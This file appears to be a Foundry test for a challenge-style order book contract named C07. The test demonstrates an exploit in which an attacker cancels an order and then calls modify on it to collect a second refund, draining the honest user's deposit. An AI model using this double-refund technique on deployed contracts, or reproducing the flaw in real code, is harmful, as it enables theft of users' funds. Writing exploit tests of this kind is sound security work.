// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/C07.sol";
contract C07Test is Test {
    TokenC07 base; TokenC07 quote; OrderBookC07 book;
    address attacker = makeAddr("attacker"); address honest = makeAddr("honest");
    function setUp() public {
        base = new TokenC07("Base", "BASE"); quote = new TokenC07("Quote", "QUOTE");
        book = new OrderBookC07(base, quote);
        base.mint(attacker, 100e18); base.mint(honest, 100e18);
        vm.prank(attacker); base.approve(address(book), type(uint256).max);
        vm.prank(honest);   base.approve(address(book), type(uint256).max);
    }
    function test_exploit_cancelThenModifyDoubleRefund() public {
        vm.prank(honest); book.place(100e18, 1e18);
        vm.startPrank(attacker);
        uint256 id = book.place(100e18, 1e18);
        book.cancel(id);
        assertEq(base.balanceOf(attacker), 100e18, "first refund");
        book.modify(id, 1, 1e18);
        vm.stopPrank();
        assertApproxEqAbs(base.balanceOf(attacker), 200e18, 1, "second refund drained");
        vm.prank(honest); vm.expectRevert(bytes("balance")); book.cancel(1);
    }
}
